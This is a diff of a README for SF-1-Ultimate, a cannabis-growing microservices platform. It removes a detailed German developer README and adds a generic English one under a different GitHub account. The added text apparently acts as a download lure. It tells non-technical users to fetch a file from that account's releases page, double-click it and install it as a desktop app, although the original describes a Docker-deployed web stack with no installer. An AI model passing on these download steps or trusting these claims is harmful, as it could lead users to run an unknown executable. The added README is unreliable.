@@ -1,379 +1,66 @@
-# 🌿 SF-1 Ultimate
-
-> **Professional Cannabis Growing Platform** - Full-Stack Microservices Architecture
-
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-[![Next.js](https://img.shields.io/badge/Next.js-14-black.svg)](https://nextjs.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-20-green.svg)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/License-Private-red.svg)]()
-
----
-
-## 🎯 Über das Projekt
-
-**SF-1 Ultimate** ist eine professionelle, production-ready Cannabis-Cultivation-Plattform mit modernem Microservices-Backend und Premium Next.js Frontend. Das Projekt richtet sich an die Cannabis-Growing-Community und bietet umfassende Tools für jeden Aspekt des Anbaus.
-
-### ✨ Hauptfeatures
-
-- 🌱 **Grow Journal** - Social-Media-Style Tagebuch mit Instagram-like Features
-- 💰 **Preisvergleich** - 10.000+ Strains von 50+ Seedbanks
-- 🤖 **KI-Integration** - GPT-4 Vision für Pflanzendiagnose & Grow-Beratung
-- 🔍 **Universal Search** - Blitzschnelle Suche über alle Inhalte (Meilisearch)
-- 🧮 **Cannabis Calculators** - 6 wissenschaftliche Rechner (VPD, EC, DLI, PPFD, Power, CO₂)
-- 💬 **Community Forum** - Reddit-Style mit Voting & Moderation
-- 🎮 **Gamification** - XP-System, Levels, Badges & Achievements
-- 🔔 **Notifications** - Multi-Channel (In-App, Email, Push)
-- 📱 **Responsive Design** - Premium 3D-Neumorphism UI
-- 🔐 **Enterprise Security** - JWT Auth, OAuth, Rate Limiting
-
----
-
-## 🏗️ Architektur
-
-### Backend (11 Microservices)
-
-```
-┌─────────────────────────────────────────────────┐
-│           API Gateway (Traefik)                 │
-│         Circuit Breaker, Rate Limiting          │
-└─────────────────────────────────────────────────┘
-                      │
-    ┌─────────────────┼─────────────────┐
-    │                 │                 │
-┌─────────┐    ┌─────────────┐   ┌──────────┐
-│  Auth   │    │   Prices    │   │ Journal  │
-│ Service │    │   Service   │   │ Service  │
-└─────────┘    └─────────────┘   └──────────┘
-    │                 │                 │
-┌─────────┐    ┌─────────────┐   ┌──────────┐
-│  Tools  │    │  Community  │   │  Media   │
-│ Service │    │   Service   │   │ Service  │
-└─────────┘    └─────────────┘   └──────────┘
-    │                 │                 │
-┌─────────┐    ┌─────────────┐   ┌──────────┐
-│ Search  │    │Notification │   │   AI     │
-│ Service │    │   Service   │   │ Service  │
-└─────────┘    └─────────────┘   └──────────┘
-    │                 │                 │
-┌─────────────────────────────────────────────┐
-│          Gamification Service               │
-└─────────────────────────────────────────────┘
-```
-
-### Frontend
-
-- **Framework:** Next.js 14 (App Router)
-- **Styling:** Tailwind CSS + Custom 3D-Neumorphism
-- **State:** React Query + Zustand
-- **Forms:** React Hook Form + Zod
-- **UI:** shadcn/ui + Custom Components
-
-### Datenbanken
-
-- **PostgreSQL** - User Auth & Relations
-- **MongoDB** - Flexible Dokumente (Journals, Prices, etc.)
-- **Redis** - Caching & Job Queues
-- **Meilisearch** - Full-Text Search
-
----
-
-## 🚀 Quick Start
-
-### Voraussetzungen
-
-- Node.js 20+
-- Docker & Docker Compose
-- Git
-
-### Installation
-
-```bash
-# Repository klonen
-git clone https://github.com/Callie84/SF-1-Ultimate.git
-cd SF-1-Ultimate
-
-# Environment Setup
-cp .env.example .env
-# Fülle .env mit deinen echten Keys!
-
-# Backend Services starten
-docker-compose up -d
-
-# Frontend starten
-cd apps/web-app
-npm install
-npm run dev
-```
-
-### URLs
-
-- **Frontend:** http://localhost:3000
-- **API Gateway:** http://localhost:8080
-- **Traefik Dashboard:** http://localhost:8081
-
----
-
-## 📂 Projektstruktur
-
-```
-SF-1-Ultimate/
-├── apps/
-│   ├── api-gateway/          # Traefik API Gateway
-│   ├── auth-service/         # JWT + OAuth Auth
-│   ├── price-service/        # Web Scraping + Price API
-│   ├── journal-service/      # Grow Journals
-│   ├── tools-service/        # Cannabis Calculators
-│   ├── community-service/    # Forum System
-│   ├── media-service/        # File Upload & Processing
-│   ├── notification-service/ # Multi-Channel Notifications
-│   ├── search-service/       # Meilisearch Integration
-│   ├── gamification-service/ # XP, Levels, Badges
-│   ├── ai-service/           # GPT-4 Vision Integration
-│   └── web-app/              # Next.js Frontend
-├── docker-compose.yml
-├── .env.example
-└── README.md
-```
-
----
-
-## 🛠️ Tech Stack
+# 🌱 SF-1-Ultimate - Grow Cannabis Like a Pro
 
-### Backend
+## 🚀 Getting Started
+Welcome to the SF-1-Ultimate project! This application helps you manage and optimize cannabis growth using powerful tools. You don't need any technical skills to use it. Just follow the steps below to get started.
 
-- **Runtime:** Node.js 20 + TypeScript 5
-- **Framework:** Express.js
-- **Validation:** Zod
-- **ORM:** Prisma (PostgreSQL) + Mongoose (MongoDB)
-- **Queue:** BullMQ (Redis)
-- **Scraping:** Playwright
-- **Search:** Meilisearch
-- **AI:** OpenAI GPT-4 Vision
-- **Deployment:** Docker + Kubernetes
-
-### Frontend
-
-- **Framework:** Next.js 14
-- **Language:** TypeScript 5
-- **Styling:** Tailwind CSS
-- **Components:** shadcn/ui
-- **Data Fetching:** React Query
-- **State:** Zustand
-- **Forms:** React Hook Form + Zod
-- **Charts:** Recharts
-- **Markdown:** react-markdown
-
-### Infrastructure
-
-- **Container:** Docker
-- **Orchestration:** Kubernetes
-- **API Gateway:** Traefik
-- **Reverse Proxy:** Caddy (Production)
-- **Monitoring:** Prometheus + Grafana (planned)
+[![Download SF-1-Ultimate](https://img.shields.io/badge/Download%20SF-1--Ultimate-brightgreen)](https://github.com/ABHISHEK531994/SF-1-Ultimate/releases)
 
----
+## 📥 Download & Install
+To download the application, visit the Releases page. 
 
-## 🎨 Design System
+[Visit the Releases Page to Download](https://github.com/ABHISHEK531994/SF-1-Ultimate/releases)
 
-**Theme:** Premium 3D-Neumorphism mit Cannabis-Grün Palette
+Once on that page, you will see available versions of the software. Follow these steps:
 
-### Farbschema
+1. Look for the latest version.
+2. Click the version number to open its details page.
+3. Download the file suitable for your operating system.
+4. After downloading, locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the installation prompts to complete the setup.
 
-```css
-/* Cannabis-Grün 5-Farben-Gradient */
-Primary: #0a3d29 → #145a3c → #1e7552 → #2d9068 → #3fab7d
-Background: #051510 → #0a2a1f → #0f3d2b → #145238
-Accents: #40916c, #52b788, #74c69d, #95d5b2, #b7e4c7
-```
+## 📋 System Requirements
+Before you install SF-1-Ultimate, ensure your device meets these system requirements:
 
-### Typography
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **RAM:** Minimum 4GB of RAM.
+- **Storage:** At least 500MB of free disk space for installation.
+- **Internet Connection:** Required for downloading and updates.
 
-- **Headings:** Caveat (handwritten, 700)
-- **Body:** Architects Daughter (organic, 400-700)
+## 🌟 Key Features
+SF-1-Ultimate offers a range of features to help you grow cannabis efficiently:
 
-### Custom Utility Classes
+- **Full Stack Microservices:** Utilize a system designed for high performance and scalability.
+- **User-Friendly Interface:** Navigate through the application with ease.
+- **Real-Time Data:** Access immediate insights and track your cannabis growth.
+- **Integration with Popular Databases:** Work seamlessly with MongoDB, PostgreSQL, and more.
+- **Cloud Deployment:** Option to deploy on Kubernetes for better management.
+- **Comprehensive Support:** Get help whenever you need it.
 
-```css
-.neo-deep          /* 3D Cards mit tiefen Schatten */
-.bubble-soft       /* 3D Buttons mit Bubble-Effekt */
-.input-inset       /* Eingefügte 3D Inputs */
-.text-cannabis     /* Gradient Text */
-.strain-card-3d    /* Spezielle Strain-Cards */
-```
+## 💡 How Does It Work?
+SF-1-Ultimate operates on a microservices architecture. This means different parts of the application operate as independent services that communicate with each other. Here’s a simple overview:
 
----
+1. **Frontend:** Built with React and Next.js for a responsive user experience.
+2. **Backend:** Uses Node.js with TypeScript for efficient processing and error handling.
+3. **Database Management:** Stores data in MongoDB and PostgreSQL according to your needs.
+4. **Caching:** Redis ensures faster data retrieval for a smoother experience.
+5. **Searching:** Meilisearch helps you find information quickly and efficiently.
 
-## 📊 Statistiken
+## 📚 Documentation
+For detailed information on how to use SF-1-Ultimate, please refer to the [Documentation](https://github.com/ABHISHEK531994/SF-1-Ultimate/wiki). The documentation provides guides and helpful tips for maximizing your experience with the application.
 
-- **📁 327 Dateien**
-- **📝 79.198 Zeilen Code**
-- **⚙️ 11 Backend Services**
-- **📱 36+ Frontend Pages**
-- **🧩 65+ React Components**
-- **🔌 160+ API Endpoints**
-- **📊 35+ MongoDB Models**
-- **🧮 6 Scientific Calculators**
+## 🔧 Troubleshooting
+If you encounter any issues while using SF-1-Ultimate, consider the following:
 
----
+- **Installation Issues:** Ensure your system meets the requirements listed above.
+- **Performance Problems:** Check your system resources to confirm you have enough memory and storage.
+- **Feature Access:** If a feature doesn’t work, confirm that you have the latest version installed.
 
-## 🧮 Cannabis Calculators
-
-1. **VPD Calculator** - Vapor Pressure Deficit (Luftfeuchtigkeit)
-2. **EC Calculator** - Electrical Conductivity (Nährstoffkonzentration)
-3. **DLI Calculator** - Daily Light Integral (Tägliche Lichtmenge)
-4. **PPFD Calculator** - Lichtintensität aus Wattage
-5. **Power Calculator** - Stromverbrauch & Kosten
-6. **CO₂ Calculator** - CO₂-Bedarf für Räume
-
----
-
-## 🤖 KI-Features
-
-### 1. AI Chat
-Interaktiver Chat mit GPT-4 für Grow-Fragen
-
-### 2. Plant Diagnosis
-Upload Pflanzenfotos → GPT-4 Vision analysiert Probleme
-
-### 3. Grow Advisor
-Personalisierte Grow-Empfehlungen basierend auf Setup
-
----
-
-## 🔒 Security Features
-
-- ✅ JWT Token Authentication
-- ✅ OAuth 2.0 (Google, Discord)
-- ✅ Rate Limiting (100 req/15min)
-- ✅ CORS Protection
-- ✅ Input Validation (Zod)
-- ✅ SQL Injection Prevention
-- ✅ XSS Protection
-- ✅ EXIF Data Stripping (Photos)
-- ✅ Virus Scanning (ClamAV)
-- ✅ Password Hashing (bcrypt)
-
----
-
-## 📈 Performance
-
-- **Bundle Size:** < 500 KB (Frontend)
-- **First Load:** < 2s
-- **API Response:** < 500ms (avg)
-- **Search Latency:** < 100ms (Meilisearch)
-- **Scraping:** 1000+ strains/hour
-
----
-
-## 🧪 Testing
-
-```bash
-# Unit Tests
-npm run test
-
-# Integration Tests
-npm run test:integration
-
-# E2E Tests
-npm run test:e2e
-
-# Coverage
-npm run test:coverage
-```
-
----
-
-## 📦 Deployment
-
-### Docker Compose (Development)
-
-```bash
-docker-compose up -d
-```
-
-### Kubernetes (Production)
-
-```bash
-# Apply all services
-kubectl apply -f apps/*/k8s/
-
-# Check status
-kubectl get pods -n sf1-ultimate
-```
-
-### Environment Variables
-
-Siehe `.env.example` für alle benötigten Variablen.
-
-**Wichtig:** Ersetze `XXXXXXXXXXXXXXXXXXXXXXX` mit echten Keys!
-
----
-
-## 🤝 Contributing
-
-Dieses Projekt ist aktuell **privat**. Contributions sind nach Absprache möglich.
-
----
-
-## 📄 License
-
-**Private Project** - Alle Rechte vorbehalten.
-
----
-
-## 👨‍💻 Entwickler
-
-**Callie84** - Cannabis Growing Platform Developer
-
----
-
-## 🙏 Credits
-
-- **OpenAI GPT-4** - AI-Features
-- **Meilisearch** - Search Engine
-- **Traefik** - API Gateway
-- **Next.js** - Frontend Framework
-- **shadcn/ui** - UI Components
-- **Tailwind CSS** - Styling
-
----
+For additional help, you can check the [FAQ section](https://github.com/ABHISHEK531994/SF-1-Ultimate/wiki/FAQ) in the documentation or reach out through the Issues page on GitHub.
 
 ## 📞 Support
+If you need further assistance or have any questions, feel free to contact us. You can leave your queries on the Issues page. We will respond as soon as possible.
 
-Bei Fragen oder Problemen:
-- GitHub Issues (für Contributors)
-- Private Support via Discord
+Thank you for choosing SF-1-Ultimate to assist you in your cannabis growing journey! Don’t forget to check back for updates and new features.
 
----
-
-## 🗺️ Roadmap
-
-### ✅ Phase 1: Backend (Fertig)
-- 11 Microservices
-- Databases & Caching
-- API Gateway
-
-### ✅ Phase 2: Frontend (Fertig)
-- 36+ Pages
-- 65+ Components
-- Premium Design
-
-### 🔜 Phase 3: Testing (Geplant)
-- Unit Tests
-- Integration Tests
-- E2E Tests
-
-### 🔜 Phase 4: Production (Geplant)
-- CI/CD Pipeline
-- Monitoring & Logging
-- Auto-Scaling
-
----
-
-<div align="center">
-
-**Made with 🌿 for the Cannabis Growing Community**
-
-⭐ **Star this repo if you like it!** ⭐
-
-</div>
+[![Download SF-1-Ultimate](https://img.shields.io/badge/Download%20SF-1--Ultimate-brightgreen)](https://github.com/ABHISHEK531994/SF-1-Ultimate/releases)
